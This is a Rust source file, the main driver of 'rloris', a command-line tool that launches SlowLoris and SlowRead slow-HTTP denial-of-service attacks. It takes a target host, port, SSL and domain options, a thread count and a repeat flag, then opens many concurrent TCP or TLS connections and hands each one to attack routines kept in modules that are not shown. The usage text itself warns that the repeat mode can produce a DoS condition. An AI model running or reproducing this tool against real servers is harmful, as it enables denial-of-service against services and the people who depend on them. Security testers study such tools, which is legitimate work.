extern crate docopt;
extern crate rustc_serialize;
extern crate openssl;
#[macro_use] extern crate log;
extern crate env_logger;

use docopt::Docopt;
use std::net::TcpStream;
use std::thread;
use openssl::ssl::{SslMethod, SslConnectorBuilder};

mod slowloris_attack;
use slowloris_attack::slowloris_attack;

mod slowread_attack;
use slowread_attack::slowread_attack;

const USAGE: &'static str = "
rloris - SlowLoris and other Slow HTTP DoSes in Rust

Usage:
    rloris (loris) <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>] [--post]
    rloris (read) <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--domain=<domain>] [--repeat] [--threads=<threads>]
    rloris (-h | --help)

Options:
    -h --help       Show this screen.
    --post          Use POST rather than GET as the default HTTP verb.
    --ssl           Use SSL. Changes default port to 443.
    --port=P        Use port P. Defaults to 80 for plaintext, 443 for SSL.
    --timeout=T     Total time for a single request, in milliseconds. [default: 1000]
    --cycles=C      Total number of additional \"keepalive\" headers to be sent. [default: 10]
    --domain=D      Override the domain name for SSL connections (e.g., if you're connecting to a raw IP address)
    --repeat        Perform the attack repeatedly (WARNING - Can produce a DoS condition!)
    --threads=T     The number of concurrent threads to spin off. [default: 1]
";

#[derive(Debug, RustcDecodable)]
struct Args {
    arg_target: String,
    flag_port: Option<usize>,
    flag_timeout: u32,
    flag_cycles: u32,
    flag_ssl: bool,
    flag_nofinalize: bool,
    flag_domain: Option<String>,
    flag_repeat: bool,
    flag_threads: usize,
    flag_post: bool,
    cmd_loris: bool,
    cmd_read: bool
}

#[derive(Debug, Clone)]
struct Target {
    domain: String,
    designator: String,
}

impl Target {
    fn new(target: String, port: usize) -> Self {
        Target {
            domain: format!("{}", target),
            designator: format!("{}:{}", target, port)
        }
    }
    fn get_designator(&self) -> &str {
        &self.designator
    }
    fn get_domain(&self) -> &str {
        &self.domain
    }
    fn set_domain(&mut self, domain: &str) {
        self.domain = domain.into();
    }
}

fn main() {
    // Set up logging
    env_logger::init().unwrap();
    debug!("Logging successfully initialized.");
    let args: Args = Docopt::new(USAGE)
                            .and_then(|d| d.decode())
                            .unwrap_or_else(|e| e.exit());

    // The default port is 80, but for SSL it's 443.
    let default_port = if args.flag_ssl { 443 } else { 80 };
    let port = args.flag_port.unwrap_or(default_port);

    let finalize = !args.flag_nofinalize;
    let cycles = args.flag_cycles;
    let timeout = args.flag_timeout;
    let repeat = args.flag_repeat;
    let threads = args.flag_threads;
    let ssl = args.flag_ssl;
    let post = args.flag_post;
    let cmd_loris = args.cmd_loris;
    let cmd_read = args.cmd_read;
    // Extract targetting information
    let mut target = Target::new(args.arg_target, port);

    // Check for domain override
    if let Some(domain) = args.flag_domain {
        target.set_domain(&domain);
    }

    loop {
        if cmd_loris {
            println!("Beginning SlowLoris against target {} with {} threads.", target.get_designator(), threads);
        } else if cmd_read {
            println!("Beginning SlowRead against target {} with {} threads.", target.get_designator(), threads);
        }
        let mut handles = Vec::with_capacity(threads);
        for threadn in 0..threads {
            let target = target.clone();
            handles.push(
                thread::spawn(move || {
                    // Attempt to connect to the target.
                    let mut tcp_stream = TcpStream::connect(target.get_designator())
                        .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect. {}", threadn, e); panic!()});
                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
                    // If needed, connect SSL to the target.
                    if ssl {
                        // Attempt to set up SSL
                        let connector = SslConnectorBuilder::new(SslMethod::tls())
                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Failed to build SSL functionality. {}", threadn, e); panic!();})
                            .build();
                        debug!("[CONTROL:{}] Built SSL functionality.", threadn);
                        // Attempt to connect SSL
                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream)
                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect TLS. {}\nDid you provide a domain name, not an IP?", threadn, e); panic!();});
                        info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
                        if cmd_loris {
                            slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
                        } else if cmd_read {
                            slowread_attack(&mut ssl_stream, timeout, threadn);
                        }
                    } else {
                        if cmd_loris {
                            slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
                        } else if cmd_read {
                            slowread_attack(&mut tcp_stream, timeout, threadn);
                        }
                    }
                })
            );
        }

        if threads > 1 {
            for handle in handles {
                match handle.join() {
                    Ok(_) => print!("."),
                    Err(_) => print!("x")
                };
                println!();
            }
        } else {
            // In this case there is only one thread. Pop it, join it, and suppress errors.
            handles.pop().unwrap().join().unwrap_or_else(|_| {()} );
        }
        if !repeat {break;}
    }
}
